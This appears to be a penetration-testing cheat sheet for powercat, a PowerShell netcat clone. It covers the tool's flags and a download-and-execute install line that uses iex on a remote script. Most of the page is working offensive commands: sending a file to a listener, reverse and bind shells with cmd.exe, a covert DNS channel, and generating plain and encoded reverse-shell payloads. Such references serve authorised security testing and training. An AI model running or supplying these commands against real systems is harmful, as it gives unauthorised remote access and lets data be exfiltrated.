---
title : "powercat"
# pre : ' '
description : "Netcat: The powershell version. (Powershell Version 2 and Later Supported)."
date : 2022-09-26T14:49:48+02:00
# hidden : true
# draft : true
weight : 230
# tags : ['']
---

---

Netcat: The powershell version. (Powershell Version 2 and Later Supported)

## Installation

powercat is a powershell function. First you need to load the function before you can execute it. You can put one of the below commands into your powershell profile so powercat is automatically loaded when powershell starts.

Download the `.ps1` here and execute with the command below.

{{%resources fa_icon_class="fas fa-terminal" pattern=".*(ps1)"/%}}

```plain
. .\powercat.ps1
```

Or invoke directly with `iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`

## Usage

```plain
powercat [-c or -l] [-p port] [options]
```

## Flags

```plain
  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                  If you are using -dns, specify the DNS Server to send queries to.

  -l              Listen Mode. Start a listener on the port specified by -p.

  -p  <port>      Port. The port to connect to, or the port to listen on.

  -e  <proc>      Execute. Specify the name of the process to start.

  -ep             Execute Powershell. Start a pseudo powershell session. You can
                  declare variables and execute commands, but if you try to enter
                  another shell (nslookup, netsh, cmd, etc.) the shell will hang.

  -r  <str>       Relay. Used for relaying network traffic between two nodes.
                  Client Relay Format:   -r <protocol>:<ip addr>:<port>
                  Listener Relay Format: -r <protocol>:<port>
                  DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>

  -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
                  must send data before the server can respond.

  -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
                  Specify the dns server to -c, the dns port to -p, and specify the
                  domain to this option, -dns. This is only a client.
                  Get the server here: https://github.com/iagox86/dnscat2

  -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
                  recieve before exiting. Set to zero when receiving files, and set high
                  for more stability over the internet.

  -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
                  connecting. Default: 60

  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                  established. Used for moving files. You can provide the path to a file,
                  a byte array object, or a string. You can also pipe any of those into
                  powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80

  -o  <type>      Output. Specify how powercat should return information to the console.
                  Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.

  -of <path>      Output File.  Specify the path to a file to write output to.

  -d              Disconnect. powercat will disconnect after the connection is established
                  and the input from -i is sent. Used for scanning.

  -rep            Repeater. powercat will continually restart after it is disconnected.
                  Used for setting up a persistent server.

  -g              Generate Payload.  Returns a script as a string which will execute the
                  powercat with the options you have specified. -i, -d, and -rep will not
                  be incorporated.

  -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                  can be executed in this way: powershell -E <encoded string>

  -h              Print this help message.
```

## Examples

### Send a file to receiver

- Receiver: `nc -nlvp 443 > out.txt`

```plain
powercat -c 10.0.0.20 -p 443 -i .\testfile.txt
```

### Shells (reverse/bind)

### Reverse shell

- Receiver: `nc -nlvp 443`
- `-e` - specifies the application that is executed once connected

```plain
powercat -c 10.0.0.20 -p 443 -e cmd.exe
```

### Bind shell

- `-l` - specifies powercat to create a listener
- `-e` - specifies the application that is executed once connected

```plain
powercat -l -p 443 -e cmd.exe
```

Once a connection is received (`nc <ip> 443`) the bind shell will be initiated.

### Payload Generation

### Standalone payloads

- Non-encoded

```plain
powercat -c 10.0.0.20 -p 443 -e cmd.exe -g > reverse-shell.ps1
```

- Encoded (run with `powershell.exe -E`)

```plain
powercat -c 10.0.0.20 -p 443 -e cmd.exe -ge > reverse-shell.ps1
```

## URL List

- [Github.com - powercat](https://github.com/besimorhino/powercat)
